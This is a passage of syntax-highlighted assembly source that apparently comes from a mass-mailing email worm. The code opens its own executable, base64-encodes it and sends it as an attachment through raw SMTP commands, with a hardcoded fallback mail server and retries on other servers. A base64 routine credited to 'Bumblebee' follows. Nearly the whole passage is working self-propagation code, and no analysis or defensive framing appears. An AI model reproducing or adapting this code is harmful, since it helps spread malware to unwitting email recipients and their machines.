</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">smtpaddress_offset</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">hardcode_server</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">open_new_socket</span><span class="sc0">

</span><span class="sc5">lets_send_mail</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">the_rcptto</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_to_socket</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SendAddress</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_from_socket</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">correct_command</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">try_another_mailserver</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">the_data</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_to_socket</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_from_socket</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mail_mode</span><span class="sc4">],</span><span class="sc5">INFO_MAIL</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">another_mail_type</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">the_datatest</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_to_socket</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">send_a_normal_mail</span><span class="sc0">

</span><span class="sc5">another_mail_type</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">the_datatest2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_to_socket</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dont_send_attachment</span><span class="sc0">

</span><span class="sc5">send_a_normal_mail</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OpenSendObject</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">freemem_offset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6000h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">freemem_offset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00003000h</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">encodeBase64</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00005000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">freemem_offset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">socket_descriptor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fileend</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_to_socket</span><span class="sc0">

</span><span class="sc5">dont_send_attachment</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">the_dot</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_to_socket</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_from_socket</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">the_quit</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_to_socket</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_from_socket</span><span class="sc0">

</span><span class="sc5">close_socket</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">socket_descriptor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc0">

</span><span class="sc5">free_the_memory</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">freemem_offset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GlobalFree</span><span class="sc0">

</span><span class="sc5">release_library</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WSACleanup</span><span class="sc0">

</span><span class="sc5">not_possible</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">read_from_socket</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_in_buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">socket_descriptor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recv</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_in_buffer</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">send_to_socket</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">socket_descriptor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SendAddress</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sendmailto_offset</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">try_next_char</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_lenght</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">try_next_char</span><span class="sc0">

</span><span class="sc5">found_lenght</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sendmailto_offset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">socket_descriptor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">go_on_to</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">go_on_to</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">socket_descriptor</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0"> 

</span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">OpenSendObject</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">myname</span><span class="sc0"> 
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0ffffffffh</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">make_map</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_socket</span><span class="sc0">

</span><span class="sc5">make_map</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filehandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00003000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READONLY</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">filehandle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">filemaphandle</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00003000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_READ</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">filemaphandle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">mapaddress</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">freemem_offset</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">6000h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3000h</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mapaddress</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filemaphandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filehandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">encodeBase64</span><span class="sc0"> </span><span class="sc9">Proc</span><span class="sc0">

</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;       EAX = Address of data to encode</span><span class="sc0">
</span><span class="sc1">;       EDX = Address to put encoded data</span><span class="sc0">
</span><span class="sc1">;       ECX = Size of data to encode</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;       ECX = size of encoded data</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; encodeBase64 by Bumblebee. All rights reserved ;)</span><span class="sc0">

       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">over_enc_table</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"abcdefghijklmnopqrstuvwxyz"</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"0123456789+/"</span><span class="sc0">
</span><span class="sc5">over_enc_table</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc5">baseLoop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00111111b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">jna</span><span class="sc0">     </span><span class="sc5">DontAddEndOfLine</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0A0Dh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">DontAddEndOfLine</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">baseLoop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">encodeBase64</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span></div></body>
</html>
